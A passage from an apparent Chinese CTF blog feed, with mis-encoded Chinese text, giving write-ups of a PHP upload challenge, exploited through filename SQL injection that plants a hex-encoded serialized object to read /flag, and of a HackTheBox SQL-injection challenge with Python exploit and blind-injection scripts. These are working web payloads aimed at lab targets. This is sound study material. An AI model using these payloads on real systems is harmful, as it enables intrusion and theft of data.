class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;id="</span>.$row[<span class="string">"id"</span>].<span class="string">" filename="</span>.$row[<span class="string">"filename"</span>].<span class="string">" path="</span>.$row[<span class="string">"path"</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="keyword">$this</span>-&gt;con);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Delete_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql = <span class="string">"DELETE FROM images"</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>helper.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $folder = <span class="string">"pic/"</span>;</span><br><span class="line"><span class="keyword">protected</span> $ifview = <span class="keyword">False</span>; </span><br><span class="line"><span class="keyword">protected</span> $config = <span class="string">"config.txt"</span>;</span><br><span class="line"><span class="comment">// The function is not yet perfect, it is not open yet.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($input=<span class="string">"file"</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$fileinfo = <span class="keyword">$this</span>-&gt;getfile($input);</span><br><span class="line">$array = <span class="keyword">array</span>();</span><br><span class="line">$array[<span class="string">"title"</span>] = $fileinfo[<span class="string">'title'</span>];</span><br><span class="line">$array[<span class="string">"filename"</span>] = $fileinfo[<span class="string">'filename'</span>];</span><br><span class="line">$array[<span class="string">"ext"</span>] = $fileinfo[<span class="string">'ext'</span>];</span><br><span class="line">$array[<span class="string">"path"</span>] = $fileinfo[<span class="string">'path'</span>];</span><br><span class="line">$img_ext = getimagesize($_FILES[$input][<span class="string">"tmp_name"</span>]);</span><br><span class="line">$my_ext = <span class="keyword">array</span>(<span class="string">"width"</span>=&gt;$img_ext[<span class="number">0</span>],<span class="string">"height"</span>=&gt;$img_ext[<span class="number">1</span>]);</span><br><span class="line">$array[<span class="string">"attr"</span>] = serialize($my_ext);</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;save($array);</span><br><span class="line"><span class="keyword">if</span> ($id == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your images is uploaded successfully. And your image's id is $id.&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getfile</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($input))&#123;</span><br><span class="line">$rs = <span class="keyword">$this</span>-&gt;check($_FILES[$input]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $rs;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$basename = substr(md5(time().uniqid()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">$filename = $info[<span class="string">"name"</span>];</span><br><span class="line">$ext = substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>);</span><br><span class="line">$cate_exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>,<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpeg"</span>);</span><br><span class="line"><span class="keyword">if</span>(!in_array($ext,$cate_exts))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">    $title = str_replace(<span class="string">"."</span>.$ext,<span class="string">''</span>,$filename);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'title'</span>=&gt;$title,<span class="string">'filename'</span>=&gt;$basename.<span class="string">"."</span>.$ext,<span class="string">'ext'</span>=&gt;$ext,<span class="string">'path'</span>=&gt;<span class="keyword">$this</span>-&gt;folder.$basename.<span class="string">"."</span>.$ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!$data || !is_array($data))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Something wrong!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">$this</span>-&gt;insert_array($data);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$sql_fields = <span class="keyword">array</span>();</span><br><span class="line">$sql_val = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">$key_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $key);</span><br><span class="line">$value_temp = str_replace(chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $value);</span><br><span class="line">$sql_fields[] = <span class="string">"`"</span>.$key_temp.<span class="string">"`"</span>;</span><br><span class="line">$sql_val[] = <span class="string">"'"</span>.$value_temp.<span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br><span class="line">mysqli_query($con, $sql);</span><br><span class="line">$id = mysqli_insert_id($con);</span><br><span class="line">mysqli_close($con);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_files</span><span class="params">($path)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;ifview == <span class="keyword">False</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line"><span class="comment">//The function is not yet perfect, it is not open yet.</span></span><br><span class="line">&#125;</span><br><span class="line">$content = file_get_contents($path);</span><br><span class="line"><span class="keyword">echo</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment"># Read some config html</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;view_files(<span class="keyword">$this</span>-&gt;config);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆä»æ¯”è¾ƒç›´è§‚çš„åœ°æ–¹å¼€å§‹å®¡è®¡ã€‚æˆ‘ä¸ªäººé¦–å…ˆä»helper.phpå¼€å§‹è§‚å¯Ÿã€‚å› ä¸ºè¿™å¾ˆæœ‰å¯èƒ½å­˜åœ¨æ˜¯ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨çš„ä»£ç ã€‚æœç„¶é¦–å…ˆæ³¨æ„åˆ°ï¼Œhelperç±»ä¸­ï¼Œæœ‰ç€ç»å…¸çš„<code>_destruct()</code>é­”æœ¯æ–¹æ³•ï¼Œå®ƒè°ƒç”¨çš„<code>view_file()</code>æ–¹æ³•ï¼Œä¼šæ‰§è¡Œ<code>file_get_contents()</code>å‡½æ•°ã€‚æ˜¾ç„¶æ˜¯åˆ©ç”¨å®ƒã€‚å›è¿‡å¤´å†ä»”ç»†çœ‹ä¸‹è§¦å‘æ–¹å¼ã€‚<br>é¦–å…ˆï¼Œåœ¨helper.phpä¸­ï¼Œå‘ç°å›¾ç‰‡çš„<code>attrå±æ€§</code>è¢«åºåˆ—åŒ–å­˜å‚¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$array[&quot;attr&quot;] &#x3D; serialize($my_ext);</span><br></pre></td></tr></table></figure><p>ä¹‹ååœ¨show.phpä¸­ï¼Œè°ƒç”¨äº†ä¸€æ¬¡ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">$attr_temp = str_replace(<span class="string">'\0\0\0'</span>, chr(<span class="number">0</span>).<span class="string">'*'</span>.chr(<span class="number">0</span>), $row[<span class="string">"attr"</span>]);</span><br><span class="line">$attr = unserialize($attr_temp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ³¨æ„æˆ‘ä»¬çš„uploadå›¾ç‰‡æ“ä½œï¼Œä¼ å›¾ç‰‡åï¼Œè°ƒç”¨äº†<code>check()</code>å‡½æ•°ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶ååšæ£€æµ‹å°±è¢«ä¿å­˜ä¸ºinfoï¼Œä¹‹åä½œä¸ºå‚æ•°ä¼ è¿›äº†<code>save()</code>å‡½æ•°ã€‚<code>save()</code>æœ¬è´¨ä¸Šæ‰§è¡Œäº†ä¸€æ¬¡sqlè¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"INSERT INTO images ("</span>.(implode(<span class="string">","</span>,$sql_fields)).<span class="string">") VALUES("</span>.(implode(<span class="string">","</span>,$sql_val)).<span class="string">")"</span>;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å…¶å®æ˜¯é€šè¿‡æ§åˆ¶ä¸Šä¼ å›¾ç‰‡çš„æ–‡ä»¶åï¼Œè§¦å‘sqlæ³¨å…¥ï¼Œè¿›ä¸€æ­¥è§¦å‘ååºåˆ—åŒ–ï¼Œè¾¾åˆ°ç›®çš„ã€‚<br>æ‰€ä»¥ç°ç”Ÿæˆååºåˆ—åŒ–payoad:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ifview = <span class="keyword">True</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = <span class="string">"/flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span>(serialize($a));</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœéœ€è¦è°ƒæ•´ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">"helper"</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">"\0\0\0ifview"</span>;b:<span class="number">1</span>;s:<span class="number">9</span>:<span class="string">"\0\0\0config"</span>;s:<span class="number">5</span>:<span class="string">"/flag"</span>;&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ç”±äºprotectedçš„å±æ€§å†³å®šçš„ã€‚å¦‚æœæ˜¯privateåˆ™æ˜¯ä¸¤ä¸ª<code>%00%00</code>ã€‚<br>ç„¶åæ„é€ æ–‡ä»¶åï¼Œæˆ‘ä»¬åªéœ€è®©æ–‡ä»¶çš„åºåˆ—åŒ–éƒ¨åˆ†æ”¹ä¸ºæˆ‘ä»¬çš„payloadã€‚åŸºäºæ™®é€šä¸Šä¼ æ‰§è¡Œè¯­å¥ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(<span class="string">'1'</span>,<span class="string">'1.jpg'</span>,<span class="string">'jpg'</span>,<span class="string">'pic/f20c76cc4fb41838.jpg'</span>,<span class="string">'a:2:&#123;s:5:"width";i:1264;s:6:"height";i:992;&#125;'</span>)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠæ–‡ä»¶åæ”¹æ”¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO images (`title`,`filename`,`ext`,`path`,`attr`) VALUES(<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="string">'1'</span>,<span class="number">0x4f3a363a2268656c706572223a323a7b733a393a225c305c305c30696676696577223b623a313b733a393a225c305c305c30636f6e666967223b733a353a222f666c6167223b7d</span>),(<span class="string">'1.jpg'</span>)</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„ç”±äºå¼•å·é—®é¢˜ï¼Œæˆ‘ä»¬çš„payloadéœ€è¦å­—ç¬¦ä¸²è½¬16è¿›åˆ¶ã€‚<br>ä¸Šä¼ æ–‡ä»¶å³å¯è§¦å‘å¾—åˆ°flag.<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox-ezpz</title>
      <link href="2020/02/06/hackthebox-ezpz/"/>
      <url>2020/02/06/hackthebox-ezpz/</url>
      
        <content type="html"><![CDATA[<p>hacktheboxä¸Šçš„web challenge ezpzæ˜¯å»å¹´åäºŒæœˆæœ«æ‰æ–°å‡ºçš„ä¸€é“ctfé¢˜ç›®ã€‚è¿™é“é¢˜ç›¸å½“çš„æœ‰æ„æ€ï¼Œè€Œä¸”å¯¹æˆ‘è¿˜æ˜¯æ¯”è¾ƒæœ‰éš¾åº¦çš„ï¼Œä½†æ˜¯åšå‡ºæ¥çš„é‚£ä¸€ç¬é—´åˆå‘ç°å…¶å®å¹¶éé‚£ä¹ˆä»¤äººå›°æ‰°ï¼Œåè€Œå­¦åˆ°äº†è®¸å¤šã€‚æ‰€ä»¥åœ¨æ­¤è®°å½•ä¸€ä¸‹åšé¢˜è¿‡ç¨‹ã€‚<br>æ„Ÿè°¢zjyå¸ˆå‚…ä»¥åŠå¤–å›½ç½‘å‹Z1LV3Rçš„æç¤º</p><a id="more"></a><p>é¦–å…ˆè¿›å…¥é¡µé¢ï¼Œå‘ç°æœ‰ä¸¤ä¸ªæŠ¥é”™ï¼š<br><img src="/2020/02/06/hackthebox-ezpz/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error1"></p><p>å…¶ä¸­ï¼Œç¬¬ä¸€ä¸ªæŠ¥é”™å…¶å®å°±æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP: Notice: Undefined variable</span><br></pre></td></tr></table></figure><p>æ„æ€æ˜¯æœ‰æœªå®šä¹‰å˜é‡ï¼Œé‚£ä¹ˆè‡ªç„¶å°±æ˜¯objäº†ã€‚æ‰€ä»¥ä¸‹ä¸€æ­¥æˆ‘ä»¬ä¼ å‚å˜é‡<br><img src="/2020/02/06/hackthebox-ezpz/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="error2"><br>é‚£ä¹ˆå¦‚ä½•è§£å†³ç¬¬äºŒä¸ªé”™è¯¯å‘¢ï¼Ÿä»ä¸­å¯ä»¥çœ‹å‡ºï¼ŒIDä¹‹äºobjå¯èƒ½æ˜¯propertyä¸objectçš„å…³ç³»ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œobjå¯èƒ½æ˜¯åŒ…å«IDçš„æŸç§åºåˆ—åŒ–æ•°æ®çš„å˜é‡ã€‚å®é™…ä¸Šï¼Œå¦‚ä¸‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$obj=<span class="keyword">array</span>(<span class="string">"ID"</span>=&gt;<span class="number">1234</span>);</span><br><span class="line"><span class="keyword">echo</span>($obj-&gt;IDS);<span class="comment">#æ­¤å¤„è®¿é—®ä¸€ä¸ªæœªå®šä¹‰çš„IDSè§¦å‘æŠ¥é”™</span></span><br></pre></td></tr></table></figure><p>ä¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$obj=json_decode(<span class="string">"&#123;'ID':'1234'&#125;"</span>);</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;IDs;</span><br></pre></td></tr></table></figure><p>çš„è¿”å›éƒ½æ˜¯ï¼š<br><img src="/2020/02/06/hackthebox-ezpz/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="æŠ¥é”™"><br>æ‰€ä»¥æˆ‘ä»¬æ‰èƒ½çœ‹åˆ°å›æ˜¾ã€‚å› æ­¤å°è¯•æ„é€ æ•°æ®å§ã€‚åŠ ä¸Šé¢˜ç›®é¡µé¢æºç ä¸­æç¤ºäº†<code>Hint : base64_encode($data)</code>&gt;ï¼ˆæˆ–è€…æˆ‘ä»¬æŠŠobjç½®ä¸ºæ•°ç»„ï¼Œä¹Ÿå¯ä»¥è§¦å‘æŠ¥é”™ï¼Œæç¤ºæˆ‘ä»¬æ•°æ®éœ€è¦<code>base64encode</code>ï¼‰<br>ç»è¿‡å°è¯•ï¼Œå¯ä»¥å‘ç°æ˜¯è¦å¯¹jsonæ•°æ®ç¼–ç ã€‚é‚£æˆ‘ä»¬ä¼ ä¸€ä¸ªIDå€¼ä¸º1çš„æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?obj&#x3D;eyJJRCI6ICIxIn0&#x3D;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/06/hackthebox-ezpz/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è€Œä¼ <code>1&#39;</code>è§¦å‘æŠ¥é”™ï¼Œä¼ <code>1&quot;</code>æ— æŠ¥é”™ã€‚ç¡®è®¤æ˜¯å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œä¸”æ˜¯å•å¼•å·é—­åˆç±»å‹ã€‚<br>äºæ˜¯ï¼Œé¢˜ç›®è¿›å…¥åˆ°äº†ä¸‹ä¸€é˜¶æ®µï¼Œsqlæ³¨å…¥ã€‚<br>æ˜¾ç„¶ä¸ºäº†è®©æˆ‘ä»¬çš„payloadæ›´æ–¹ä¾¿ï¼Œæœ€å¥½å…ˆå†™å¥½expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://docker.hackthebox.eu:30163/index.php?obj="</span></span><br><span class="line">payload=<span class="string">"1"</span></span><br><span class="line">payload = base64.b64encode(json.dumps(&#123;<span class="string">"ID"</span>: payload&#125;).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">payload = str(payload, <span class="string">'utf-8'</span>)</span><br><span class="line">url += payload</span><br><span class="line">r = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(r.text, <span class="string">'html.parser'</span>)</span><br><span class="line">body = soup.find(<span class="string">'body'</span>).text.strip()</span><br><span class="line">print(body)</span><br></pre></td></tr></table></figure><p>äºæ˜¯é€šè¿‡FUZZï¼Œå‘ç°å­˜åœ¨ä¸å°‘è¿‡æ»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">order by</span><br><span class="line">ï¼Œ</span><br><span class="line">concat</span><br><span class="line">information_schema.tables</span><br><span class="line">where</span><br><span class="line">limit</span><br></pre></td></tr></table></figure><p>è€Œä¸”ä»¥ä¸Šè¿‡æ»¤éƒ½æ˜¯æ­£åˆ™åŒ¹é…ï¼Œæ²¡æ³•ç”¨æ‹›æ•°ç»•è¿‡ï¼Œåªèƒ½æ‰¾æ›¿ä»£ã€‚<br>é¦–å…ˆ<code>order by</code>ç”¨<code>group by</code>ä»£æ›¿ï¼Œè¿™ç‚¹ä¸éš¾ã€‚å¾—åˆ°å­—æ®µæ•°ä¸º2ã€‚é€—å·è¿‡æ»¤å°±æ¯”è¾ƒå±€é™äº†ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬è¦ä¹ˆä½¿ç”¨ç›²æ³¨ï¼Œè¦ä¹ˆä½¿ç”¨<code>join</code>æ³¨å…¥ã€‚<code>information_schema.tables</code>åœ¨ä¹‹å‰çš„swpuweb1ä¸­ä¹Ÿè§åˆ°è¿‡äº†ï¼Œè‚¯å®šå­˜åœ¨å¯¹åº”çš„æ›¿ä»£è¡¨å¯ä»¥è®©æˆ‘ä»¬è·å–è¡¨åã€‚ä½†æ˜¯<code>where, concat,limit</code>ä¸å¤ªå¥½è§£å†³ã€‚(å…¶å®åˆ°æœ€åæ‰å‘ç°ï¼Œä¸éœ€è¦åº”å¯¹è¿™å‡ ä¸ªè¿‡æ»¤)å…¶ä¸­<code>concat</code>ä¹Ÿè®¸å¯ä»¥ç”¨<code>make_set()</code>èµ·åˆ°è¿æ¥å­—ç¬¦ä¸²çš„æ•ˆæœã€‚ä½†æ˜¯<code>make_set()</code>éœ€è¦è‡³å°‘ä¸¤ä¸ªå‚æ•°ï¼Œä¹Ÿå¿…é¡»è¦é€—å·ï¼›è€Œ<code>where</code>ç­‰ç­‰è¿‡æ»¤ä¹Ÿä¸å¥½åŠã€‚</p><p>æ€»ä¹‹å…ˆä»ç®€å•çš„å¼€å§‹å§ï¼Œæˆ‘é€‰æ‹©ä½¿ç”¨ç›²æ³¨çˆ†å‡ºæ•°æ®åº“åä¸ç‰ˆæœ¬å·ã€‚<br>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>, <span 